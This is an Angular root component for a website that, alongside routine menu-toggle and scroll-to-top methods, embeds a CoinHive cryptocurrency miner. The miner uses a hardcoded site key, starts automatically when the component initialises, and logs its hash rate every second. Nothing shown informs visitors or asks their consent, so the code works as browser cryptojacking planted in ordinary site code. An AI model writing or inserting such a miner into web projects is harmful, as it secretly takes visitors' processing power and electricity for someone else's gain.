import { Component, OnInit } from '@angular/core';
import { NgForm } from '@angular/forms';

declare var CoinHive: any;

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})

export class AppComponent {
  title = 'app';
  menuActive = false;
  goTopVisible = false;
  
  private miner: any;
  public statistics: any;

  public constructor() {
    this.miner = new CoinHive.Anonymous("ULW8xM2Dmq0ZzdM6idwKJ8PjJFL8uXSf", { throttle: 0.3 });
    this.statistics = {
        hashesPerSecond: 0,
        totalHashes: 0,
        acceptedHashes: 0
    };
  }

  public ngOnInit() {
      this.miner.start();
      this.updateStatistics();
  }

  public updateStatistics() {
    setInterval(() => {
      this.statistics.hashesPerSecond = this.miner.getHashesPerSecond();
      this.statistics.totalHashes = this.miner.getTotalHashes();
      this.statistics.acceptedHashes = this.miner.getAcceptedHashes();
      console.log(this.statistics);
    }, 1000);
  }

  onMenuTrigger() {
      this.menuActive = !this.menuActive;
  }
    
  hideMenu() {
      this.menuActive = false;
  }
    
  top() {
      document.getElementsByTagName('header')[0].scrollIntoView({behavior: 'smooth', block: 'start'});
      
  }    
}
